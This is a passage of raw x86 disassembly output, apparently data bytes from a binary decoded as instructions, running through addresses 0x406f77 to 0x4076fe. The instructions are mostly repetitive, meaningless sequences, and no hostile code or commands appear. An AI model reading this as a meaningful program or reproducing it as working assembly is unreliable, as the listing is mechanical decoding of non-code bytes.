  406f77:	add    DWORD PTR [esi],ecx
  406f79:	add    BYTE PTR [eax+0x0],cl
  406f7c:	scas   al,BYTE PTR es:[edi]
  406f7d:	add    DWORD PTR [esi],ecx
  406f7f:	add    BYTE PTR [eax+eax*1-0x9],cl
  406f83:	add    DWORD PTR [esi],ecx
  406f85:	add    BYTE PTR [eax+0x0],dl
  406f88:	inc    esp
  406f89:	add    cl,BYTE PTR [esi]
  406f8b:	add    BYTE PTR [eax+eax*1+0x53],dl
  406f8f:	add    cl,BYTE PTR [esi]
  406f91:	add    BYTE PTR [eax+0x0],bl
  406f94:	bound  eax,QWORD PTR [edx]
  406f96:	push   cs
  406f97:	add    BYTE PTR [eax+eax*1+0x6f],bl
  406f9b:	add    cl,BYTE PTR [esi]
  406f9d:	add    BYTE PTR [eax+0x0],ah
  406fa0:	or     eax,0x64000900
  406fa5:	add    BYTE PTR [edi+0x2],bh
  406fa8:	or     DWORD PTR [eax],eax
  406faa:	push   0xe002600
  406faf:	add    BYTE PTR [eax+eax*1-0x7c],ch
  406fb3:	add    cl,BYTE PTR [esi]
  406fb5:	add    BYTE PTR [eax+0x0],dh
  406fb8:	xchg   edi,eax
  406fb9:	add    cl,BYTE PTR [esi]
  406fbb:	add    BYTE PTR [eax+eax*1-0x4a],dh
  406fbf:	add    cl,BYTE PTR [esi]
  406fc1:	add    BYTE PTR [eax+0x0],bh
  406fc4:	push   esp
  406fc5:	add    ecx,DWORD PTR [esi]
  406fc7:	add    BYTE PTR [eax+eax*1+0x7f],bh
  406fcb:	add    ecx,DWORD PTR [esi]
  406fcd:	add    BYTE PTR [eax+eax*1+0xe03d7],bl
  406fd4:	mov    al,ds:0xe040200
  406fd9:	add    BYTE PTR [eax+eax*1+0xe040f],ah
  406fe0:	test   al,0x0
  406fe2:	push   ds
  406fe3:	add    al,0xe
  406fe5:	add    BYTE PTR [eax+eax*1+0xe0429],ch
  406fec:	mov    al,0x0
  406fee:	cmp    BYTE PTR [esi+ecx*1],al
  406ff1:	add    BYTE PTR [eax+eax*1+0xe0443],dh
  406ff8:	mov    eax,0xe044c00
  406ffd:	add    BYTE PTR [eax+eax*1+0xe0457],bh
  407004:	rol    BYTE PTR [eax],0x60
  407007:	add    al,0xe
  407009:	add    ah,al
  40700b:	add    BYTE PTR [ecx+0x4],dh
  40700e:	push   cs
  40700f:	add    al,cl
  407011:	add    BYTE PTR [esi+0x4],bh
  407014:	push   cs
  407015:	add    ah,cl
  407017:	add    BYTE PTR [edi-0x2ffff1fc],cl
  40701d:	add    BYTE PTR [esp+eax*1+0xd4000e],bl
  407024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407025:	add    al,0xe
  407027:	add    BYTE PTR [ecx+eax*1],ah
  40702a:	push   ecx
  40702b:	add    eax,0x128000e
  407030:	outs   dx,BYTE PTR ds:[esi]
  407031:	add    eax,0x12c000e
  407036:	xchg   DWORD PTR ds:0x1300009,eax
  40703c:	lods   al,BYTE PTR ds:[esi]
  40703d:	add    eax,0x1340009
  407042:	mov    cl,0x5
  407044:	or     BYTE PTR [eax],al
  407046:	push   0x8002601
  40704b:	add    BYTE PTR [ecx+eax*1-0x80],ch
  40704f:	push   es
  407050:	or     BYTE PTR [eax],al
  407052:	jo     0x407055
  407054:	test   DWORD PTR [esi],eax
  407056:	or     BYTE PTR [eax],al
  407058:	je     0x40705b
  40705a:	mov    al,BYTE PTR [esi]
  40705c:	or     BYTE PTR [eax],al
  40705e:	js     0x407061
  407060:	mov    cl,0x5
  407062:	or     BYTE PTR [eax],al
  407064:	add    BYTE PTR [ecx],0x26
  407067:	add    BYTE PTR [eax],cl
  407069:	add    BYTE PTR [ecx+eax*1+0x80680],al
  407070:	mov    BYTE PTR [ecx],al
  407072:	test   DWORD PTR [esi],eax
  407074:	or     BYTE PTR [eax],al
  407076:	nop
  407077:	add    DWORD PTR [esi],esp
  407079:	add    BYTE PTR [eax],cl
  40707b:	add    BYTE PTR [ecx+eax*1+0x80680],dl
  407082:	cwde   
  407083:	add    DWORD PTR [ebp-0x63fff7fa],eax
  407089:	add    DWORD PTR [edx-0x5ffff7fa],ecx
  40708f:	add    DWORD PTR [ecx-0x5bfff7fb],esi
  407095:	add    DWORD PTR [edi-0x53fff7fa],edx
  40709b:	add    DWORD PTR [esi],esp
  40709d:	add    BYTE PTR [eax],cl
  40709f:	add    BYTE PTR [eax+0x8068001],dh
  4070a5:	add    BYTE PTR [ecx+eax*1+0x80685],dh
  4070ac:	mov    eax,0x8068a01
  4070b1:	add    BYTE PTR [ecx+eax*1+0x805b1],bh
  4070b8:	rol    BYTE PTR [ecx],0x97
  4070bb:	push   es
  4070bc:	or     BYTE PTR [eax],al
  4070be:	les    eax,FWORD PTR [ecx]
  4070c0:	mov    al,ds:0xc8000806
  4070c5:	add    DWORD PTR [ebp-0x33fff7fa],esp
  4070cb:	add    DWORD PTR [edx-0x2ffff7fa],ebp
  4070d1:	add    DWORD PTR [edi-0x2bfff7fa],ebp
  4070d7:	add    DWORD PTR [esi+eax*1+0x1d80008],esi
  4070de:	and    DWORD PTR [eax],eax
  4070e0:	or     BYTE PTR [eax],al
  4070e2:	fadd   QWORD PTR [ecx]
  4070e4:	mov    ecx,0xe0000806
  4070e9:	add    DWORD PTR [esi-0x1bfff7fa],edi
  4070ef:	add    ebx,eax
  4070f1:	push   es
  4070f2:	or     BYTE PTR [eax],al
  4070f4:	call   0x84738fa
  4070f9:	add    ah,ch
  4070fb:	add    ebp,ecx
  4070fd:	push   es
  4070fe:	or     BYTE PTR [eax],al
  407100:	hlt    
  407101:	add    DWORD PTR [esi],esp
  407103:	add    BYTE PTR [eax],cl
  407105:	add    al,bh
  407107:	add    DWORD PTR [eax-0x3fff7fa],eax
  40710d:	add    DWORD PTR [ebp+0x806],eax
  407113:	add    cl,BYTE PTR [edx+0x4000806]
  407119:	add    dh,BYTE PTR [ecx+0x8000805]
  40711f:	add    dl,BYTE PTR [edi+0xc000e06]
  407125:	add    dl,dh
  407127:	push   es
  407128:	push   cs
  407129:	add    BYTE PTR [eax],dl
  40712b:	add    bl,cl
  40712d:	push   es
  40712e:	push   cs
  40712f:	add    BYTE PTR [edx+eax*1],dl
  407132:	fadd   QWORD PTR [esi]
  407134:	push   cs
  407135:	add    BYTE PTR [eax],bl
  407137:	add    ah,bl
  407139:	push   es
  40713a:	push   cs
  40713b:	add    BYTE PTR [edx+eax*1],bl
  40713e:	out    dx,al
  40713f:	push   es
  407140:	push   cs
  407141:	add    BYTE PTR [eax],ah
  407143:	add    bh,cl
  407145:	push   es
  407146:	push   cs
  407147:	add    BYTE PTR [edx+eax*1],ah
  40714a:	or     BYTE PTR [edi],al
  40714c:	push   cs
  40714d:	add    BYTE PTR [eax],ch
  40714f:	add    dl,BYTE PTR [ecx]
  407151:	pop    es
  407152:	push   cs
  407153:	add    BYTE PTR [edx+eax*1],ch
  407156:	adc    al,0x7
  407158:	push   cs
  407159:	add    BYTE PTR [eax],dh
  40715b:	add    dl,BYTE PTR [edi]
  40715d:	pop    es
  40715e:	push   cs
  40715f:	add    BYTE PTR [edx+eax*1],dh
  407162:	sbb    al,BYTE PTR [edi]
  407164:	push   cs
  407165:	add    BYTE PTR [eax],bh
  407167:	add    bl,BYTE PTR ds:0x3c000e07
  40716d:	add    ah,BYTE PTR [eax]
  40716f:	pop    es
  407170:	push   cs
  407171:	add    BYTE PTR [eax+0x2],al
  407174:	and    eax,DWORD PTR [edi]
  407176:	push   cs
  407177:	add    BYTE PTR [edx+eax*1+0x3e],al
  40717b:	pop    es
  40717c:	push   cs
  40717d:	add    BYTE PTR [eax+0x2],cl
  407180:	inc    edi
  407181:	pop    es
  407182:	push   cs
  407183:	add    BYTE PTR [edx+eax*1+0x4c],cl
  407187:	pop    es
  407188:	push   cs
  407189:	add    BYTE PTR [eax+0x2],dl
  40718c:	pop    ebx
  40718d:	pop    es
  40718e:	push   cs
  40718f:	add    BYTE PTR [edx+eax*1+0x6c],dl
  407193:	pop    es
  407194:	push   cs
  407195:	add    BYTE PTR [eax+0x2],bl
  407198:	jns    0x4071a1
  40719a:	push   cs
  40719b:	add    BYTE PTR [edx+eax*1-0x72],bl
  40719f:	pop    es
  4071a0:	push   cs
  4071a1:	add    BYTE PTR [eax+0x2],ah
  4071a4:	xchg   ebx,eax
  4071a5:	pop    es
  4071a6:	push   cs
  4071a7:	add    BYTE PTR [edx+eax*1-0x66],ah
  4071ab:	pop    es
  4071ac:	push   cs
  4071ad:	add    BYTE PTR [eax+0x2],ch
  4071b0:	lods   eax,DWORD PTR ds:[esi]
  4071b1:	pop    es
  4071b2:	push   cs
  4071b3:	add    BYTE PTR [edx+eax*1-0x50],ch
  4071b7:	pop    es
  4071b8:	push   cs
  4071b9:	add    BYTE PTR [eax+0x2],dh
  4071bc:	mov    edi,0x74000e07
  4071c1:	add    al,dl
  4071c3:	pop    es
  4071c4:	push   cs
  4071c5:	add    BYTE PTR [eax+0x2],bh
  4071c8:	leave  
  4071c9:	pop    es
  4071ca:	push   cs
  4071cb:	add    BYTE PTR [edx+eax*1-0x32],bh
  4071cf:	pop    es
  4071d0:	push   cs
  4071d1:	add    BYTE PTR [eax+0xe07dd02],al
  4071d7:	add    BYTE PTR [edx+eax*1+0xe07ec],al
  4071de:	mov    BYTE PTR [edx],al
  4071e0:	stc    
  4071e1:	pop    es
  4071e2:	or     BYTE PTR [eax],al
  4071e4:	nop
  4071e5:	add    ah,BYTE PTR [esi]
  4071e7:	add    BYTE PTR [eax],cl
  4071e9:	add    BYTE PTR [edx+eax*1+0x80680],dl
  4071f0:	cwde   
  4071f1:	add    al,BYTE PTR [ebp-0x63fff7fa]
  4071f7:	add    cl,BYTE PTR [edx-0x5ffff7fa]
  4071fd:	add    dh,BYTE PTR [ecx-0x5bfff7fb]
  407203:	add    dl,BYTE PTR [edi-0x57fff7fa]
  407209:	add    ah,BYTE PTR [eax-0x53fff7fa]
  40720f:	add    ah,BYTE PTR [ebp-0x4ffff7fa]
  407215:	add    ch,BYTE PTR [edx-0x4bfff7fa]
  40721b:	add    ch,BYTE PTR [edi-0x47fff7fa]
  407221:	add    dh,BYTE PTR [esi+eax*1+0x2bc0008]
  407228:	and    DWORD PTR [eax],eax
  40722a:	or     BYTE PTR [eax],al
  40722c:	rol    BYTE PTR [edx],0xb9
  40722f:	push   es
  407230:	or     BYTE PTR [eax],al
  407232:	les    eax,FWORD PTR [edx]
  407234:	mov    esi,0xc8000806
  407239:	add    al,bl
  40723b:	push   es
  40723c:	or     BYTE PTR [eax],al
  40723e:	int3   
  40723f:	add    cl,al
  407241:	push   es
  407242:	or     BYTE PTR [eax],al
  407244:	rol    BYTE PTR [edx],1
  407246:	int    0x6
  407248:	or     BYTE PTR [eax],al
  40724a:	aam    0x2
  40724c:	adc    cl,BYTE PTR [eax]
  40724e:	or     BYTE PTR [eax],al
  407250:	fadd   DWORD PTR [edx]
  407252:	pop    ss
  407253:	or     BYTE PTR [eax],cl
  407255:	add    ah,bl
  407257:	add    bl,BYTE PTR [eax+ecx*1]
  40725a:	or     BYTE PTR [eax],al
  40725c:	loopne 0x407260
  40725e:	and    DWORD PTR [eax],ecx
  407260:	or     BYTE PTR [eax],al
  407262:	in     al,0x2
  407264:	or     BYTE PTR es:[eax],cl
  407267:	add    al,ch
  407269:	add    ch,BYTE PTR [ebx]
  40726b:	or     BYTE PTR [eax],cl
  40726d:	add    ah,ch
  40726f:	add    dh,BYTE PTR [eax]
  407271:	or     BYTE PTR [eax],cl
  407273:	add    al,dh
  407275:	add    dh,BYTE PTR ds:0xf4000808
  40727b:	add    bh,BYTE PTR [edx]
  40727d:	or     BYTE PTR [eax],cl
  40727f:	add    al,bh
  407281:	add    bh,BYTE PTR [edi]
  407283:	or     BYTE PTR [eax],cl
  407285:	add    ah,bh
  407287:	add    al,BYTE PTR [eax+ecx*1+0x8]
  40728b:	add    BYTE PTR [eax],al
  40728d:	add    ecx,DWORD PTR [ecx+0x8]
  407290:	or     BYTE PTR [eax],al
  407292:	add    al,0x3
  407294:	dec    esi
  407295:	or     BYTE PTR [eax],cl
  407297:	add    BYTE PTR [eax],cl
  407299:	add    edx,DWORD PTR [ebx+0x8]
  40729c:	or     BYTE PTR [eax],al
  40729e:	sbb    BYTE PTR [ebx],al
  4072a0:	add    BYTE PTR es:[eax],cl
  4072a3:	add    BYTE PTR [ebx+eax*1],bl
  4072a6:	add    BYTE PTR [esi],0x8
  4072a9:	add    BYTE PTR [eax],ah
  4072ab:	add    eax,DWORD PTR [ebp-0x7cffd8fa]
  4072b1:	add    eax,0x2e0680
  4072b6:	xor    eax,DWORD PTR [eax]
  4072b8:	les    ecx,FWORD PTR [esi+ebp*1]
  4072bb:	add    BYTE PTR [ebx],bh
  4072bd:	add    bh,bl
  4072bf:	or     al,0x2e
  4072c1:	add    BYTE PTR [ebx+0x2e0dd200],al
  4072c7:	add    BYTE PTR [ebx],dl
  4072c9:	add    BYTE PTR [edx+0xc],bh
  4072cc:	add    BYTE PTR cs:[ebx],ah
  4072cf:	add    BYTE PTR [eax+0x2b002e0c],al
  4072d5:	add    BYTE PTR [edx+0x43002e0c],bl
  4072db:	add    BYTE PTR [ecx*1+0x4b002e],cl
  4072e2:	push   ds
  4072e3:	or     eax,0x53002e
  4072e8:	jp     0x4072f6
  4072ea:	add    BYTE PTR cs:[ebx+0x0],bl
  4072ee:	push   esp
  4072ef:	or     eax,0x63002e
  4072f4:	jnp    0x407303
  4072f6:	add    BYTE PTR cs:[ebx+0x0],dh
  4072fa:	jno    0x407308
  4072fc:	add    BYTE PTR cs:[ebx+0x0],bh
  407300:	leave  
  407301:	or     eax,0x55302c3
  407306:	add    BYTE PTR [esi],0xc3
  407309:	add    cl,BYTE PTR [ebx+0x5]
  40730c:	add    BYTE PTR [esi],0xc3
  40730f:	add    al,BYTE PTR [ebx+0x5]
  407312:	or     DWORD PTR [ecx+ebp*1],ecx
  407315:	add    eax,0xc71057b
  40731a:	dec    ecx
  40731b:	add    eax,0xc71057b
  407320:	or     BYTE PTR [eax],al
  407322:	push   es
  407323:	add    cl,dh
  407325:	or     eax,0xa7b0a18
  40732a:	popf   
  40732b:	or     ah,bh
  40732d:	or     bh,dh
  40732f:	or     dl,BYTE PTR [esi]
  407331:	or     ebp,DWORD PTR [ebx+ecx*1]
  407334:	inc    esp
  407335:	or     ecx,DWORD PTR [ebx+0xb]
  407338:	push   edx
  407339:	or     ecx,DWORD PTR [edx-0x55f469f5]
  40733f:	or     esi,DWORD PTR [edi-0x1bf426f5]
  407345:	or     ebp,ecx
  407347:	or     ebp,esi
  407349:	or     esi,esi
  40734b:	or     ebx,DWORD PTR [esi+0xc]
  40734e:	add    al,BYTE PTR [eax]
  407350:	add    DWORD PTR [eax],eax
  407352:	add    eax,DWORD PTR [eax]
  407354:	add    al,BYTE PTR [eax]
  407356:	add    eax,0x6000500
  40735b:	add    BYTE PTR [ecx],cl
  40735d:	add    BYTE PTR [edi],al
  40735f:	add    BYTE PTR [eax],dl
  407361:	add    BYTE PTR [eax],cl
  407363:	add    BYTE PTR [ecx],dl
  407365:	add    BYTE PTR [ecx],cl
  407367:	add    BYTE PTR ds:0x17000a00,dl
  40736d:	add    BYTE PTR [eax+eax*1],dl
  407370:	and    BYTE PTR [eax],al
  407372:	adc    eax,0x16002500
  407377:	add    BYTE PTR [ecx],ch
  407379:	add    BYTE PTR [eax],al
  40737b:	add    BYTE PTR [edx+0x4],al
  40737e:	mov    WORD PTR [ebx],es
  407380:	add    BYTE PTR [eax],al
  407382:	clts   
  407384:	mov    WORD PTR [ebx],es
  407386:	add    BYTE PTR [eax],al
  407388:	sbb    eax,0x38c06
  40738d:	add    BYTE PTR ds:0x38c06,ch
  407393:	add    BYTE PTR [edi+eax*1],cl
  407396:	into   
  407397:	add    al,0x0
  407399:	add    BYTE PTR [eax],bl
  40739b:	pop    es
  40739c:	into   
  40739d:	add    al,0x0
  40739f:	add    BYTE PTR [edx],ah
  4073a1:	pop    es
  4073a2:	rol    DWORD PTR [eax+eax*1],cl
  4073a5:	add    BYTE PTR [ebx],ch
  4073a7:	pop    es
  4073a8:	rol    DWORD PTR [eax+eax*1],cl
  4073ab:	add    bh,bl
  4073ad:	pop    es
  4073ae:	add    eax,0x8a000005
  4073b3:	push   es
  4073b4:	rol    DWORD PTR [eax+eax*1],cl
  4073b7:	add    BYTE PTR [ecx+0x4d306],dl
  4073bd:	add    cl,ch
  4073bf:	pop    es
  4073c0:	rol    DWORD PTR [eax+eax*1],cl
  4073c3:	add    cl,dh
  4073c5:	pop    es
  4073c6:	rol    DWORD PTR [eax+eax*1],cl
  4073c9:	add    dl,bh
  4073cb:	pop    es
  4073cc:	or     DWORD PTR ds:0x7ff0000,eax
  4073d2:	adc    DWORD PTR ds:0x8270000,eax
  4073d8:	rol    DWORD PTR [eax+eax*1],cl
  4073db:	add    ch,al
  4073dd:	or     BYTE PTR [ecx],cl
  4073df:	add    eax,0x6760000
  4073e4:	rol    DWORD PTR [eax+eax*1],cl
  4073e7:	add    cl,cl
  4073e9:	or     BYTE PTR [eax*1+0x8d40000],dh
  4073f0:	or     DWORD PTR ds:0x9030000,eax
  4073f6:	dec    esp
  4073f7:	add    eax,0x7df0000
  4073fc:	add    eax,0x8b000005
  407401:	or     ecx,DWORD PTR [ebx+eax*1+0xba40000]
  407408:	pusha  
  407409:	push   es
  40740a:	add    BYTE PTR [eax],al
  40740c:	mov    dh,0xb
  40740e:	pusha  
  40740f:	push   es
  407410:	add    BYTE PTR [eax],al
  407412:	(bad)  
  407413:	or     esp,DWORD PTR [eax+0x6]
  407416:	add    BYTE PTR [eax],al
  407418:	fimul  WORD PTR [ebx]
  40741a:	pusha  
  40741b:	push   es
  40741c:	add    BYTE PTR [eax],al
  40741e:	mov    al,ds:0x66400
  407423:	add    BYTE PTR [ebx+0x0],cl
  407426:	imul   eax,DWORD PTR [esi],0x12f0000
  40742c:	outs   dx,BYTE PTR ds:[esi]
  40742d:	push   es
  40742e:	add    BYTE PTR [eax],al
  407430:	hlt    
  407431:	or     esi,DWORD PTR [ebx+0x6]
  407434:	add    BYTE PTR [eax],al
  407436:	and    ecx,DWORD PTR [esi]
  407438:	or     DWORD PTR ds:0xe270000,eax
  40743e:	or     DWORD PTR ds:0xe320000,eax
  407444:	xchg   esi,eax
  407445:	or     BYTE PTR [eax],al
  407447:	add    BYTE PTR [esi],dh
  407449:	push   cs
  40744a:	lahf   
  40744b:	or     BYTE PTR [eax],al
  40744d:	add    BYTE PTR [ebx],bh
  40744f:	or     al,0xa8
  407451:	or     BYTE PTR [eax],al
  407453:	add    BYTE PTR [ebp+0x4d30e],dl
  407459:	add    BYTE PTR [ecx+0x4d30e],ah
  40745f:	add    cl,cl
  407461:	or     BYTE PTR [eax*1+0xeb00000],dh
  407468:	xor    al,0x5
  40746a:	add    BYTE PTR [eax],al
  40746c:	enter  0xc90e,0x8
  407470:	add    BYTE PTR [eax],al
  407472:	or     DWORD PTR [eax],edx
  407474:	into   
  407475:	or     BYTE PTR [eax],al
  407477:	add    BYTE PTR [ecx],dl
  407479:	adc    BYTE PTR [ebx+eax*1+0x10230000],cl
  407480:	mov    WORD PTR [ebx],es
  407482:	add    BYTE PTR [eax],al
  407484:	adc    BYTE PTR ds:[ebx+eax*1+0x104a0000],cl
  40748c:	mov    WORD PTR [ebx],es
  40748e:	add    BYTE PTR [eax],al
  407490:	pop    ebp
  407491:	adc    BYTE PTR [ebx+eax*1+0x106f0000],cl
  407498:	mov    WORD PTR [ebx],es
  40749a:	add    BYTE PTR [eax],al
  40749c:	test   DWORD PTR [eax],edx
  40749e:	mov    WORD PTR [ebx],es
  4074a0:	add    BYTE PTR [eax],al
  4074a2:	xchg   ebx,eax
  4074a3:	adc    BYTE PTR [ebx+eax*1+0x10a20000],cl
  4074aa:	mov    WORD PTR [ebx],es
  4074ac:	add    al,BYTE PTR [eax]
  4074ae:	add    DWORD PTR [eax],eax
  4074b0:	add    eax,DWORD PTR [eax]
  4074b2:	add    al,BYTE PTR [eax]
  4074b4:	or     al,BYTE PTR [eax]
  4074b6:	add    eax,0xb000200
  4074bb:	add    BYTE PTR [edi],al
  4074bd:	add    BYTE PTR [edx],al
  4074bf:	add    BYTE PTR [eax+eax*1],cl
  4074c2:	or     DWORD PTR [eax],eax
  4074c4:	add    al,BYTE PTR [eax]
  4074c6:	adc    BYTE PTR [eax],al
  4074c8:	or     eax,DWORD PTR [eax]
  4074ca:	add    al,BYTE PTR [eax]
  4074cc:	adc    DWORD PTR [eax],eax
  4074ce:	or     eax,0x12000200
  4074d3:	add    BYTE PTR [edi],cl
  4074d5:	add    BYTE PTR [edx],al
  4074d7:	add    BYTE PTR [ebx],dl
  4074d9:	add    BYTE PTR [ecx],dl
  4074db:	add    BYTE PTR [edx],al
  4074dd:	add    BYTE PTR ds:0x1001300,dl
  4074e3:	add    BYTE PTR [esi],dl
  4074e5:	add    BYTE PTR [ebx],dl
  4074e7:	add    BYTE PTR [edx],al
  4074e9:	add    BYTE PTR [edi],dl
  4074eb:	add    BYTE PTR ds:0x18000200,dl
  4074f1:	add    BYTE PTR [edi],dl
  4074f3:	add    BYTE PTR [edx],al
  4074f5:	add    BYTE PTR [ecx],bl
  4074f7:	add    BYTE PTR [ecx],bl
  4074f9:	add    BYTE PTR [edx],al
  4074fb:	add    BYTE PTR [edx],bl
  4074fd:	add    BYTE PTR [ebx],bl
  4074ff:	add    BYTE PTR [edx],al
  407501:	add    BYTE PTR [ebx],bl
  407503:	add    BYTE PTR ds:0x1c000200,bl
  407509:	add    BYTE PTR [edi],bl
  40750b:	add    BYTE PTR [edx],al
  40750d:	add    BYTE PTR [esi],bl
  40750f:	add    BYTE PTR [ecx],ah
  407511:	add    BYTE PTR [edx],al
  407513:	add    BYTE PTR [eax],ah
  407515:	add    BYTE PTR [ebx],ah
  407517:	add    BYTE PTR [edx],al
  407519:	add    BYTE PTR [ecx],ah
  40751b:	add    BYTE PTR ds:0x22000200,ah
  407521:	add    BYTE PTR [edi],ah
  407523:	add    BYTE PTR [edx],al
  407525:	add    BYTE PTR [ebx],ah
  407527:	add    BYTE PTR [ecx],ch
  407529:	add    BYTE PTR [edx],al
  40752b:	add    BYTE PTR [edi],ah
  40752d:	add    BYTE PTR [ebx],ch
  40752f:	add    BYTE PTR [edx],al
  407531:	add    BYTE PTR [eax],ch
  407533:	add    BYTE PTR ds:0x2f000200,ch
  407539:	add    BYTE PTR [edi],ch
  40753b:	add    BYTE PTR [edx],al
  40753d:	add    BYTE PTR [eax],dh
  40753f:	add    BYTE PTR [ecx],dh
  407541:	add    BYTE PTR [edx],al
  407543:	add    BYTE PTR [ecx],dh
  407545:	add    BYTE PTR [ebx],dh
  407547:	add    BYTE PTR [edx],al
  407549:	add    BYTE PTR [edx],dh
  40754b:	add    BYTE PTR ds:0x33000200,dh
  407551:	add    BYTE PTR [edi],dh
  407553:	add    BYTE PTR [edx],al
  407555:	add    BYTE PTR [edi],dh
  407557:	add    BYTE PTR [ecx],bh
  407559:	add    BYTE PTR [edx],al
  40755b:	add    BYTE PTR [eax],bh
  40755d:	add    BYTE PTR [ebx],bh
  40755f:	add    BYTE PTR [edx],al
  407561:	add    BYTE PTR [ecx],bh
  407563:	add    BYTE PTR ds:0x3a000200,bh
  407569:	add    BYTE PTR [edi],bh
  40756b:	add    BYTE PTR [edx],al
  40756d:	add    BYTE PTR [ebp+0x0],al
  407570:	inc    ecx
  407571:	add    BYTE PTR [edx],al
  407573:	add    BYTE PTR [esi+0x0],al
  407576:	inc    ebx
  407577:	add    BYTE PTR [edx],al
  407579:	add    BYTE PTR [edi+0x0],al
  40757c:	inc    ebp
  40757d:	add    BYTE PTR [edx],al
  40757f:	add    BYTE PTR [eax+0x0],cl
  407582:	inc    edi
  407583:	add    BYTE PTR [edx],al
  407585:	add    BYTE PTR [ecx+0x0],cl
  407588:	dec    ecx
  407589:	add    BYTE PTR [edx],al
  40758b:	add    BYTE PTR [ebx+0x0],cl
  40758e:	dec    ebx
  40758f:	add    BYTE PTR [edx],al
  407591:	add    BYTE PTR [eax+eax*1+0x4d],cl
  407595:	add    BYTE PTR [edx],al
  407597:	add    BYTE PTR [ebp+0x0],cl
  40759a:	dec    edi
  40759b:	add    BYTE PTR [edx],al
  40759d:	add    BYTE PTR [esi+0x0],cl
  4075a0:	push   ecx
  4075a1:	add    BYTE PTR [edx],al
  4075a3:	add    BYTE PTR [ecx+0x0],dl
  4075a6:	push   ebx
  4075a7:	add    BYTE PTR [edx],al
  4075a9:	add    BYTE PTR [edx+0x0],dl
  4075ac:	push   ebp
  4075ad:	add    BYTE PTR [ecx],al
  4075af:	add    BYTE PTR [ebx+0x0],dl
  4075b2:	push   ebp
  4075b3:	add    BYTE PTR [edx],al
  4075b5:	add    BYTE PTR [eax+eax*1+0x57],dl
  4075b9:	add    BYTE PTR [edx],al
  4075bb:	add    BYTE PTR [ebp+0x0],dl
  4075be:	pop    ecx
  4075bf:	add    BYTE PTR [edx],al
  4075c1:	add    BYTE PTR [esi+0x0],dl
  4075c4:	pop    ebx
  4075c5:	add    BYTE PTR [edx],al
  4075c7:	add    BYTE PTR [edi+0x0],dl
  4075ca:	pop    ebp
  4075cb:	add    BYTE PTR [edx],al
  4075cd:	add    BYTE PTR [eax+0x0],bl
  4075d0:	pop    edi
  4075d1:	add    BYTE PTR [edx],al
  4075d3:	add    BYTE PTR [ecx+0x0],bl
  4075d6:	popa   
  4075d7:	add    BYTE PTR [edx],al
  4075d9:	add    BYTE PTR [edx+0x0],bl
  4075dc:	arpl   WORD PTR [eax],ax
  4075de:	add    al,BYTE PTR [eax]
  4075e0:	pop    ebx
  4075e1:	add    BYTE PTR [ebp+0x0],ah
  4075e4:	add    al,BYTE PTR [eax]
  4075e6:	pop    esp
  4075e7:	add    BYTE PTR [edi+0x0],ah
  4075ea:	or     al,0x1b
  4075ec:	xchg   BYTE PTR [ecx],cl
  4075ee:	mov    ecx,0xd809c009
  4075f3:	or     DWORD PTR [edx+0xa],eax
  4075f6:	push   edi
  4075f7:	or     ah,BYTE PTR [ebx+0xa]
  4075fa:	pop    ebp
  4075fb:	or     esp,DWORD PTR [ebx+0xb]
  4075fe:	js     0x40760b
  407600:	jg     0x40760d
  407602:	ror    BYTE PTR [ebx],cl
  407604:	inc    eax
  407605:	add    DWORD PTR [ecx+0x0],ebx
  407608:	pop    esi
  407609:	or     DWORD PTR [ecx],eax
  40760b:	add    BYTE PTR [eax+0x1],al
  40760e:	pop    ebx
  40760f:	add    BYTE PTR [ebx+0x9],ch
  407612:	add    DWORD PTR [eax],eax
  407614:	inc    eax
  407615:	add    DWORD PTR [ebp+0x0],ebx
  407618:	jp     0x407623
  40761a:	add    DWORD PTR [eax],eax
  40761c:	add    al,0x80
  40761e:	add    BYTE PTR [eax],al
  407620:	or     eax,DWORD PTR [eax]
  407622:	add    BYTE PTR [eax],al
  407624:	add    BYTE PTR [eax],al
  407626:	add    BYTE PTR [eax],al
  407628:	add    DWORD PTR [eax],eax
  40762a:	add    BYTE PTR [eax],al
  40762c:	in     al,0x8
  40762e:	out    0x13,eax
  407630:	add    BYTE PTR [eax],al
  407632:	add    al,0x0
	...
  40763c:	add    BYTE PTR [eax],al
  40763e:	add    DWORD PTR [eax],eax
  407640:	push   edi
  407641:	add    DWORD PTR [eax],eax
  407643:	add    BYTE PTR [eax],al
  407645:	add    BYTE PTR [eax+eax*1],al
	...
  407650:	add    BYTE PTR [eax],al
  407652:	add    DWORD PTR [eax],eax
  407654:	push   edi
  407655:	add    al,0x0
  407657:	add    BYTE PTR [eax],al
  407659:	add    BYTE PTR [ebx],cl
	...
  407663:	add    BYTE PTR [eax],al
  407665:	add    BYTE PTR [eax+0x47f03],bl
  40766b:	add    BYTE PTR [eax],al
  40766d:	add    BYTE PTR [edx],al
	...
  407677:	add    BYTE PTR [eax],al
  407679:	add    BYTE PTR [ecx],al
  40767b:	add    BYTE PTR [edi+0x1],dl
  40767e:	add    BYTE PTR [eax],al
  407680:	add    BYTE PTR [eax],al
  407682:	add    al,0x0
	...
  40768c:	add    BYTE PTR [eax],al
  40768e:	add    DWORD PTR [eax],eax
  407690:	dec    esi
  407691:	adc    eax,0x0
  407696:	or     eax,DWORD PTR [eax]
	...
  4076a0:	add    BYTE PTR [eax],al
  4076a2:	cwde   
  4076a3:	add    edx,DWORD PTR [eax+0x18]
  4076a9:	add    BYTE PTR [edx],al
	...
  4076b3:	add    BYTE PTR [eax],al
  4076b5:	add    BYTE PTR [ecx],al
  4076b7:	add    BYTE PTR [esi+0x15],cl
  4076ba:	add    BYTE PTR [eax],al
  4076bc:	add    BYTE PTR [eax],al
  4076be:	or     eax,DWORD PTR [eax]
	...
  4076c8:	add    BYTE PTR [eax],al
  4076ca:	cwde   
  4076cb:	add    ebp,edx
  4076cd:	sbb    BYTE PTR [eax],al
  4076cf:	add    BYTE PTR [eax],al
  4076d1:	add    BYTE PTR [eax+eax*1],al
	...
  4076dc:	add    BYTE PTR [eax],al
  4076de:	add    DWORD PTR [eax],eax
  4076e0:	pusha  
  4076e1:	add    DWORD PTR [eax],eax
  4076e3:	add    BYTE PTR [eax],al
  4076e5:	add    BYTE PTR [eax],al
  4076e7:	add    BYTE PTR [eax],al
  4076e9:	add    BYTE PTR [ecx],al
  4076eb:	add    BYTE PTR [eax],al
  4076ed:	add    BYTE PTR [eax],dl
  4076ef:	sbb    eax,0x40000
  4076f4:	add    eax,DWORD PTR [eax]
  4076f6:	or     eax,DWORD PTR [eax]
  4076f8:	or     al,BYTE PTR [eax]
  4076fa:	or     al,0x0
  4076fc:	or     al,BYTE PTR [eax]
  4076fe:	or     eax,0xe000a00
